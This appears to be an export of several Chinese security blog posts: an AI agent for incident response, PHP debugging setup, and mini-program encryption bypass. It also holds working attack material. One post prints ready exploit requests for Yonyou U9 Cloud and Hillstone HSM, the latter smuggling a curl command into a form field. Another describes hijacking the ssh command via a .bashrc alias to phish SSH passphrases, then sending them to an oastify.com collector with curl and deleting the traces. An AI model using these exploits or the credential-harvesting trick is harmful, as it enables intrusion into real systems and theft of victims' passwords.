[{"title":"AI初识之ReAct&MCP","path":"/posts/39741.html","content":"2026年年初计划通过AI辅助代码审计，次篇为agent初次尝试，使用agent+mcp进行应急响应。 0.1 MCP serverMCP服务器是模型上下文协议（MCP）架构中的关键组件。 MCP只规定了与MCP server 与MCP host（cline、claude、kiro等agent）之间的协议。 也就是mcp server相等于AI的触手，AI可以通过MCP达成各种各样的操作，如下案例（在下文中会详细描述如何编写一个mcp） 0.1.2 java内存马查杀MCP编写uv地址：https://github.com/astral-sh/uv uv 是一个极快的 Python 包和项目管理工具，由 Astral（Ruff 的创建者）开发，使用 Rust 编写。它旨在替代传统 Python 工具链中的多个工具（如 pip、pip-tools、virtualenv、poetry 等），提供更高效的依赖管理、环境管理和脚本执行功能。 使用下面命令创建项目： 1234567891011uv init weather # 初始化一个名为 &quot;weather&quot; 的新项目 # 会创建 weather 文件夹，包含 pyproject.toml 等基础文件cd weather # 进入项目目录uv venv # 创建 Python 虚拟环境 # 默认在当前目录下生成 .venv 文件夹source .venv/bin/activate # 激活虚拟环境（macOS/Linux） # 激活后，pip/python 命令都指向虚拟环境 # Windows 用: .venv\\Scripts\\activate 这里使用kiro（aws编程助手，使用其他编程助手也可）编写一个mcp，下面为提示词： 1234567891011网络搜索关于MCP的信息，帮我编写一个java 内存马查杀的mcp，其中你需要调用https://github.com/private-xss/memory-shell-detector 这个工具，下载地址是https://xget.xi-xu.me/gh/private-xss/memory-shell-detector/releases/download/1/java.zip 1、需要编写一个ssh连接的tools，并可以执行命令2、需要编写一个在本地执行命令的tools3、需要编写一个可以使用memory-shell-detector的tools（你需要查看https://github.com/private-xss/memory-shell-detector如果使用）注意：1、使用uv执行项目2、加载source .venv/bin/activate虚拟环境秩序3、你可以查看当前目录下的文件，修改，main.py 提示： private-xss&#x2F;memory-shell-detector 是一个内存马检测查杀的项目 MCP中可以有多个tools（功能，如：sqlmap，其中可以注入，查询，写文件等功能） 此时完成之后，我们只需要配置agent的MCP，就可以使用此MCP功能。 1234567891011121314151617181920212223242526&#123; &quot;mcpServers&quot;: &#123; // 服务器名称：Java 内存马检测器 &quot;java-memory-shell-detector&quot;: &#123; // 启动命令：使用 uv (Python 包管理器) 来运行 &quot;command&quot;: &quot;uv&quot;, // 命令参数： // - &quot;run&quot;: 执行 Python 脚本 // - &quot;--directory&quot;: 指定项目目录 // - &quot;/path/to/this/project&quot;: 项目的实际路径（需要替换为真实路径） // - &quot;main.py&quot;: 入口文件 &quot;args&quot;: [&quot;run&quot;, &quot;--directory&quot;, &quot;/path/to/this/project&quot;, &quot;main.py&quot;], // 环境变量（当前为空） &quot;env&quot;: &#123;&#125;, // 是否禁用此服务器（false = 启用） &quot;disabled&quot;: false, // 自动批准的工具列表（当前为空，所有工具调用都需要用户确认） &quot;autoApprove&quot;: [] &#125; &#125;&#125; 如下图： 0.1.2 java内存马查杀MCP使用此时我们打开对话框： 此时kiro会询问我们是否使用此tools。 运行结果： 0.2 agent之ReAct在上面中MCP接入的kiro也是一个agent，包括claude也是一个agent，agent不同的区别在于架构范式以及内置tools。 ReAct (Reasoning and Acting)： 一种将“思考”和“行动”紧密结合的范式，让智能体边想边做，动态调整。 Plan-and-Solve： 一种“三思而后行”的范式，智能体首先生成一个完整的行动计划，然后严格执行。 Reflection： 一种赋予智能体“反思”能力的范式，通过自我批判和修正来优化结果。 上面三种是业内常见的架构范式，在下文中，我们使用ReAct编写一个排除挖坑病毒的agent，并且结合skills。 0.2.1 Agent Skills 概念（总结skills，本质上就是提示词，只是加载方式不同，下面概念了解一下即可，只需要知道这个是链式调用，且可以执行脚本） Agent Skills 是一种轻量级、开放的格式，用于通过专业知识和工作流扩展AI智能体的能力。 Skills 的核心是一个包含 SKILL.md 文件的文件夹。 该文件包含元数据（至少包含 name 和 description）以及指导智能体执行特定任务的指令。 Skills 还可以捆绑脚本、模板和参考资料。 (上图来源[3]) 在agent与智能体进行通信的时候，将元数据发送给智能体，并结合用户的输入，如果用户输入和元数据挂钩，那么就会继续调用后续内容（链式调用）。 字段 必填 描述 name 是 最多64个字符。仅允许小写字母、数字和连字符。不能以连字符开头或结尾。 description 是 最多1024个字符。非空。描述该 Skill 的功能及适用场景。 license 否 许可证名称或引用的捆绑许可证文件。 compatibility 否 最多500个字符。说明环境要求（目标产品、系统包、网络访问权限等）。 metadata 否 用于附加元数据的任意键值映射。 allowed-tools 否 Skill 可使用的预批准工具列表（空格分隔）。（实验性功能） 123456789101112131415---name: pdf-processingdescription: 从PDF文件中提取文本和表格，填写表单，合并文档。---# PDF处理## 何时使用此 skill当用户需要处理PDF文件时使用此 skill...## 如何提取文本1. 使用 pdfplumber 进行文本提取...## 如何填写表格... 123456789目录结构示例my-skill/├── SKILL.md # 主指令├── scripts/ # 可执行脚本│ ├── process.py│ └── analyze.sh└── resources/ # 模板、示例└── template.md 0.2.2 提示词提示词： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455REACT_PROMPT_TEMPLATE = &quot;&quot;&quot;# 角色定义你是一个具备多种专业技能(Skills)的网络安全溯源专家智能体。你能够根据任务需求，自动激活相关技能并调用对应工具来完成复杂任务。# 已加载的技能 (Skills)以下是当前可用的技能模块：&#123;skills_summary&#125;# 当前激活的技能详情&#123;active_skill_content&#125;# 可用工具列表&#123;tools&#125;# 思考与行动框架 (ReAct Framework)你必须遵循 &quot;思考-行动-观察&quot; 的循环模式来解决问题：## 响应格式Thought: [你的推理过程]- 分析当前问题状态- 确定需要激活哪个技能- 规划下一步行动Action: [执行的动作]- 调用工具: `工具名[参数]`- 结束任务: `Finish[最终答案]`## 执行规则1. **技能激活**: 根据任务关键词自动匹配并激活相关技能2. **工具调用**: 每次只执行一个Action，等待Observation后再继续3. **迭代推进**: 基于观察结果调整策略，逐步逼近目标4. **任务完成**: 收集足够信息后，使用 `Finish[答案]` 输出最终结果## 质量标准- 推理过程清晰、有逻辑- 工具调用准确、参数正确- 参考技能文档中的专业知识- 安全意识强、操作谨慎# 当前任务**Question**: &#123;question&#125;**历史记录**:&#123;history&#125;# 开始执行请基于上述框架和已激活的技能知识，开始你的思考和行动：&quot;&quot;&quot; skills详情（此处参考：[4]） 12345678910111213141516171819202122232425262728293031323334---name: Linux安全应急响应description: Linux系统安全应急响应手册，包含挖矿病毒、远控后门、勒索病毒、暴力破解、隧道检测等安全事件的排查与处置方法---# Linux安全应急响应技能本技能提供Linux系统安全应急响应的完整知识库，涵盖各类安全事件的排查与处置方法。## 适用场景- Linux服务器遭受攻击后的应急响应- 挖矿病毒、远控后门、勒索病毒等恶意软件处置- SSH/MySQL/Redis/FTP等服务暴力破解事件排查- 隧道检测与处置（SSH隧道、DNS隧道、ICMP隧道等）- 恶意软件包供应链攻击排查- 系统常规安全检查与加固- 安全事件善后处理## 参考文档- #[[file:references/注意事项.md]] - 应急响应注意事项- #[[file:references/挖矿病毒.md]] - 挖矿病毒排查与处置- #[[file:references/远控后门.md]] - 远控后门排查与处置- #[[file:references/勒索病毒.md]] - 勒索病毒排查与处置- #[[file:references/暴力破解.md]] - 暴力破解事件排查- #[[file:references/非持续性事件.md]] - 非持续性安全事件处置- #[[file:references/恶意软件包供应链攻击.md]] - 供应链攻击排查- #[[file:references/隧道.md]] - 隧道检测与处置- #[[file:references/常规安全检查.md]] - 系统安全检查清单- #[[file:references/善后阶段.md]] - 安全事件善后处理- #[[file:references/常见问题解决方法.md]] - 常见问题解决方案- #[[file:references/小技巧.md]] - 应急响应实用技巧 其中这里的tools和mcp中的tools并没有区别，这里的tools只有连接ssh的tools。 0.2.3 运行效果(清除木马)这里我们使用棉花糖的靶场[1]作为演示: 给agent的输入： 开始加载技能，并调用指定的tools： 结果： 最终内容： 1234567891011121314151617181920212223242526272829303132333435## 挖矿病毒处置完成报告### 发现的安全问题1. **挖矿病毒进程**：发现java进程运行/tmp/miner.jar，CPU占用率高达118.8%2. **持久化机制**：存在crontab定时任务，每分钟执行/usr/share/.per/persistence.sh守护脚本3. **恶意文件备份**：在/usr/share/.miner/目录下存在miner.jar备份文件### 已执行的处置措施1. **进程查杀**： - 杀死第一个挖矿进程组(PGID 1079) - 杀死第二个挖矿进程组(PGID 60502) 2. **文件清理**： - 删除/tmp/miner.jar - 删除/usr/share/.per/persistence.sh守护脚本 - 删除/usr/share/.miner/目录及其中的备份文件 3. **持久化机制清除**： - 使用`crontab -r`清除了所有定时任务### 验证结果- ✅ 当前无挖矿进程运行- ✅ CPU使用率恢复正常（从133.3%降至0.0%）- ✅ 所有恶意文件已删除- ✅ 定时任务已清除### 建议1. 建议检查系统是否存在其他安全漏洞，防止再次被入侵2. 建议定期更新系统和应用补丁3. 建议配置防火墙规则，限制不必要的网络访问4. 建议监控系统日志，及时发现异常行为**处置状态**：✅ 挖矿病毒已完全清除🤔 思考: 根据历史记录，我已经对服务器进行了挖矿病毒的排查和处置。现在需要总结整个过程，确认是否已经完全清除挖矿病毒，并给出最终结论。🎉 最终答案: 挖矿病毒处置完成报告 0.3 总结在测试的时候，笔者使用了glm-5.7以及deepseek-chat，不同模型对于结果影响很大，包括提示词(Prompt)，以及不同的模型提供商，而且ReAct模式下，在Prompt描述不清晰的情况下会导致死循环。 0.4 参考&amp;引用[1]: https://vip.bdziyi.com/ulab/\t“棉花糖靶场”[2]: https://datawhalechina.github.io/hello-agents/#/./chapter4/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20%E6%99%BA%E8%83%BD%E4%BD%93%E7%BB%8F%E5%85%B8%E8%8C%83%E5%BC%8F%E6%9E%84%E5%BB%BA?id=_41-%e7%8e%af%e5%a2%83%e5%87%86%e5%a4%87%e4%b8%8e%e5%9f%ba%e7%a1%80%e5%b7%a5%e5%85%b7%e5%ae%9a%e4%b9%89\t“Hello-agent”[3]: https://www.bilibili.com/video/BV1cGigBQE6n/?share_source=copy_web&amp;vd_source=33ab2fb0a56ff9d229e039e5c557497f\t“哔哩哔哩：Agent Skill 从使用到原理”[4]: https://books.noptrace.com/linux/5.%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/\t“网络安全应急响应手册 — NOPTeam”","tags":["AI-agent-应急响应"],"categories":["AI-学习"]},{"title":"快速获取最新0day情报","path":"/posts/16615.html","content":"安全厂商对漏洞进行披露的时候一般会披露出漏洞的产品的名称以及漏洞复现截图，此时我们可以借助nextrap网站搜索蜜罐捕捉到的POC。 nextrap地址：https://www.nextrap.net/ 0.1 nextrap搜索技巧nextrap官网描述： 其中我们可以通过特定的语法检索POC： 0.1.1 实战搜索 用友U9 Cloud 命令执行漏洞描述 最新披露的用友U9 Cloud 未授权远程代码执行漏洞，首先我们需要获取准确的产品名称： （用友U9 Cloud ）全称：U9-用友-智能网关-智能工厂 使用测绘语法搜索产品： 1product=&quot;U9-用友-智能网关-智能工厂&quot; &amp;&amp; url=&quot;*ervice.asmx&quot; 次语法解释： product 产品名 url url路径（其中*为通配符） 此时我们可以通过检索信息找寻POC（如下图所示，就是最新的U9 命令执行POC）。 12345678910111213141516171819POST /U9C/CS/Office/OfficeReportCommonService.asmx HTTP/1.1Host: &#123;&#123;Hostname&#125;&#125;Accept-Encoding: gzipConnection: keep-aliveContent-Length: 4573Content-Type: text/xml; charset=utf-8Soap-Date: 23449262Soapaction: &quot;http://tempuri.org/ReleaseReport&quot;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/[REDACTED] Safari/537.36&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soap:Body&gt; &lt;ReleaseReport xmlns=&quot;http://tempuri.org/&quot;&gt; &lt;context&gt;string&lt;/context&gt; &lt;excelReportSolution&gt;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&lt;/excelReportSolution&gt; &lt;/ReleaseReport&gt; &lt;/soap:Body&gt;&lt;/soap:Envelope&gt; 0.1.2 实战搜索 山石网科安全管理平台HSM 命令执行漏洞漏洞信息：NCC-2025-00663 此时我们先定位产品： 在产品的下面会提示部分命令执行漏洞的路径 然后使用测绘语法 1product=&quot;山石网科安全管理平台HSM&quot; &amp;&amp; url=&quot;*applyLicense*&quot; product 产品名 url url路径（其中*为通配符） 此时我们发现POC是关键信息是加*的，此时我们可以继续翻页查找，就可以找到关键POC。 123456789101112POST /rest/common/licenseService/applyLicense HTTP/1.1Host: &#123;&#123;Hostname&#125;&#125;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: keep-aliveContent-Length: 188Content-Type: application/x-www-form-urlencoded; charset=UTF-8Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36parameter=&#123;&quot;License&quot;:&#123;&quot;consumer&quot;:&quot;1&quot;,&quot;address&quot;:&quot;1&quot;,&quot;zipCode&quot;:&quot;1;curl http://utmlq3ul.requestrepo.com/126;&quot;,&quot;contactor&quot;:&quot;1&quot;,&quot;telphone&quot;:&quot;1&quot;,&quot;email&quot;:&quot;hillstone@hillstone.com&quot;,&quot;enabled&quot;:true&#125;&#125;","tags":["漏洞信息"],"categories":["信息收集"]},{"title":"代码审计之Mac使用flyEnv动态调试php","path":"/posts/54078.html","content":"在Windows下我们可以使用PHPstudy搭建php环境进行代码审计，在macOS下我们可以使用flyEnv进行环境搭建。 flyEnv可以使用多种环境： 0.1 前期搭建0.1.1 软件安装 环境：https://github.com/xpf0000/FlyEnv brew：https://gitee.com/cunkai/HomebrewCN php版本：7.3 添加版本（如果不添加就无法安装7.3版本）：brew tap shivammathur/php 下载版本：brew install php@7.3 0.1.2 FlyEnv使用按照下图进行配置，其中域名可以随意输入，php版本选择我们刚刚安装的版本： 0.2 调试配置0.2.1 安装Xdebug扩展 安装成功显示： 0.2.2 在php.ini中配置 在最下面添加： 1234567891011[xdebug]zend_extension = &quot;xdebug.so&quot;xdebug.idekey = &quot;PHPSTORM&quot;xdebug.client_host = localhostxdebug.client_port = 9003xdebug.mode = debugxdebug.profiler_append = 0xdebug.profiler_output_name = cachegrind.out.%pxdebug.start_with_request = yesxdebug.trigger_value=StartProfileForMexdebug.output_dir = /tmp 点击保存，并重启php服务 0.3 phpStorm 配置编辑配置 + —&gt; 添加PHP网页–&gt;编辑服务器（主机名输入刚刚我们随机输入的域名）确定即可 在设置中，选择调试，修改调试端口为9003 选择DBGp代理，按照下图配置 123PHPSTORMlocalhost9003 0.4 验证测试演示文件 12345678&lt;?phpecho 123;function add($a, $b)&#123; echo $a + $b;&#125;add(1, 2); 打上打断 开启监听（默认为红色，绿色则为开启） 运行调试（由于我这里用了美化插件，所以图标不一样） 会自动打开浏览器，我们修改后面的文件，即可开始调试","tags":["代码审计"]},{"title":"小程序渗透实战绕过数据包加密","path":"/posts/40384.html","content":"0.1 前言在进行小程序的渗透的时候发现请求包中的请求体是加密数据，本意是开发人员不想让人看到其中的数据： 防止数据被轻易窥探 防止请求被重放 增加逆向工程难度 保护敏感业务逻辑 如下图所示： 0.2 绕过0.2.1 工具下面我将用实战案例描述针对这种类型的站点我们怎么样进行绕过。 所需工具： https://github.com/fasnow/fine 作用：针对小程序进行反编译 https://github.com/cloud-jie/CloudX 作用：针对加密、防重放、签名进行操作 0.2.2 思路小程序请求体的数据是加密一般加密算法在前端的JS中，在发送请求数据包的时候，就把关键数据进行加密，其中我们也可以利用这个特性找到加密算法： 通过强开F12断点调试小程序前端查找加密算法 优点：更加清晰准确的找到加密算法，而且定位准确 缺点：微信号容易被封 通过反编译小程序从源码中查找加密算法 优点：微信号不容易被封，且找寻算法过程较快 缺点：会定位到很多加密算法，需要挨个尝试加密算法 以上两点均可以找到关键加密算法，下面中我将使用通过反编译查找加密算法 0.3 方法0.3.1 反编译寻找关键点使用fine工具针对小程序进行反编译 得到源码之后，我们在进行全局搜索关键词encrypt、decrypt、AES、RSA。 其中，我们可以通过webStorm直接搜索到关键点 由于小程序反编译之后代码比较凌乱找寻起来比较耗费时间，此时我们可以仔细观察： 带有KEY字段的样式以及：enc.Utf8.parse以及AES.encrypt这种关键信息 这时，我们通过刚刚上面两种方式就可以找到关键点，包括加密信息： 或者使用自动化匹配脚本：https://github.com/RuoJi6/script-demo/tree/main/python/extract_keys 下载脚本，修改脚本main函数中的search_directory指向指定小程序反后的目录 运行脚本，可以得到如下信息： 其中，我们可以从中的得到关键的信息，通过全局搜索脚本得到的信息，我们可以找到关键的加密算法以及密钥还有偏移。 也可以通过加密摘要得到信息 得到的加密代码可以直接给AI进行识别： 0.3.2 自动化加解密使用Burp Suite抓包工具，使用CloudX进行加解密测试 0.3.2.1 加载插件 0.3.2.2 解密流程此时抓包，我们可以找到红框内为加密数据 选中数据包，发送到插件 请求参数-&gt;请求体-&gt;requestBody-&gt;加解密配置-&gt;选择我们找到的算法 我们填入对应的值，点击解密，就可以成功解密数据 0.3.2.3 自动解密我们可以设置，爆破模型下，以及抓包，重放包模式下，自动加密解密： 点击下图中的按钮，添加，就可以在抓包，重放包模式下，自动加密解密 测试是否正常：点击查看当前已配置的规则-&gt;执行-&gt;就可以看到黄色样式，表示成功 此时我们在进行抓包，就可以看到抓到的包已经是加密了的，而且不管是重发包以及爆破模式下，都是自动加解密。","tags":["渗透测试"]},{"title":"水坑攻击获取SSH密钥文件密码","path":"/posts/5181.html","content":"在2025年03月19日，遇到一个问题，如下： 思路 使用ssh2john针对密钥密码进行暴力破解。 重写ssh验证密码模块。 使用别名+脚本模拟ssh验证密码登录框。 这里我选择通过使用别名+脚本模拟ssh验证密码登录框，利用在ssh登录输入密码不可见的特性，利用受害者的心里，输入密码的时候以为是密码错误，进行水坑攻击。 别名+脚本模拟ssh验证密码登录框alias 命令用于创建命令的快捷方式或别名，以便简化复杂的命令或减少重复输入。你可以通过 alias 将一个长的命令或常用的命令组合定义为一个简短的别名。 1alias 别名=&#x27;命令&#x27; 例如，如果你想将 ls -la 命令简化为 ll，可以这样做： 1alias ll=&#x27;ls -la&#x27; 之后，你只需输入 ll，系统就会执行 ls -la。 删除别名 1unalias ll 设计思路通过将python脚本设置为别名，将别名设置为/root/.bashrc中，设置为Bash shell加载，然后使用python模拟ssh认证输入密码，不管用户输入什么将一直报错，将得到的密码保存到本地，但是这里要考虑的问题： 在通过python模拟ssh认证输入密码，alias如何删除？ 如何只使用一次模拟ssh认证？ 得到密钥之后当前文件怎么样删除？ 在下面代码中模拟的是在乌班图中验证ssh密码，设计思路： 使用getpass模拟ssh输入密码，会出现以下三种情况：使用ssh_key认证，使用ssh_key认证但密钥不存在，使用密码登录。 123456789101112131415161718192021222324252627282930root@ubuntu-linux-2404:/home/parallels# ssh -i ssh_key parallels@10.211.55.9Enter passphrase for key &#x27;ssh_key&#x27;: Enter passphrase for key &#x27;ssh_key&#x27;: Enter passphrase for key &#x27;ssh_key&#x27;: parallels@10.211.55.9&#x27;s password: Permission denied, please try again.parallels@10.211.55.9&#x27;s password: Permission denied, please try again.parallels@10.211.55.9&#x27;s password: parallels@10.211.55.9: Permission denied (publickey,password).root@ubuntu-linux-2404:/home/parallels# ssh -i ssh_key parallels@10.211.55.9Warning: Identity file ssh_key not accessible: No such file or directory.parallels@10.211.55.9&#x27;s password: Permission denied, please try again.parallels@10.211.55.9&#x27;s password: Permission denied, please try again.parallels@10.211.55.9&#x27;s password: parallels@10.211.55.9: Permission denied (publickey,password).root@ubuntu-linux-2404:/home/parallels# ssh parallels@10.211.55.9parallels@10.211.55.9&#x27;s password: Permission denied, please try again.parallels@10.211.55.9&#x27;s password: Permission denied, please try again.parallels@10.211.55.9&#x27;s password: parallels@10.211.55.9: Permission denied (publickey,password). 使用sys.argv捕捉后面的参数。 使用异常模块捕捉ctr+c推出异常。 程序执行完成恢复&#x2F;root&#x2F;.bashrc文件，并删除别名。 实战测试别名设置： unalias ssh 删除别名，这个需要在python脚本前面，如果在后面python的sys捕捉不到命令参数。 1alias ssh=&#x27;unalias ssh &gt; /dev/null 2&gt;&amp;1;python3 /tmp/test.py&#x27; 操作流程： vim /root/.bashrc 最后一行： alias ssh=&#39;unalias ssh &gt; /dev/null 2&gt;&amp;1;python3 /tmp/.test.py&#39; 执行：source /root/.bashrc 执行 vim /tmp/.test.py，写入python文件 python文件：https://github.com/RuoJi6/script-demo/tree/main/python/alias_ssh 模拟受害者受害者在机器上登录指定机器，并输入密钥密码。 我们利用ssh输入密码特性看不见输入的密码，让受害者误以为是自己输入错误，从而让受害者一直输入密码。 当运行完成之后，受害者再次登录测试，就会发现登录成功。 攻击者查看密码cat /tmp/.test 就可以看到受害者输入的ip地址，用户名以及密码。 扩展思路python模拟ssh终端，然后自身文件会删除，那&#x2F;tmp&#x2F;.test文件能不能通过http请求，发送到互联网，而不是保存在本地？ 思路： 在自己服务器上开启一个http服务接收。 使用dnslog接收。 使用互联网泄露的邮箱接收。 使用互联网泄露的OSS存储筒，通过未授权上传接收。 使用未授权文件上传，发送时伪装成图片上传到别人网站上。 dnslog实验：在下面代码中，我们读取文件，请求dnslog并将内容以post发送到dnslog中，并删除文件。 我们把这行代码放在python末尾中。注意：这里需要使用burp suite的dnslog！！！ 1os.system(&#x27;curl -X POST -H &quot;Content-Type: text/plain&quot; -d &quot;$(cat /tmp/.test)&quot; http://b1d4m6en9eupxlam9dhcl5hmldr4fu3j.oastify.com/ &gt; /dev/null 2&gt;&amp;1;rm /tmp/.test&#x27;) dnslog受害者我们这里模拟受害者在进行输入的时候发现了异常，密码输入不正确，通过ctr+c终止输入的情况。 这里受害者通过ctr+c退出进程。 如果受害者进行排查： 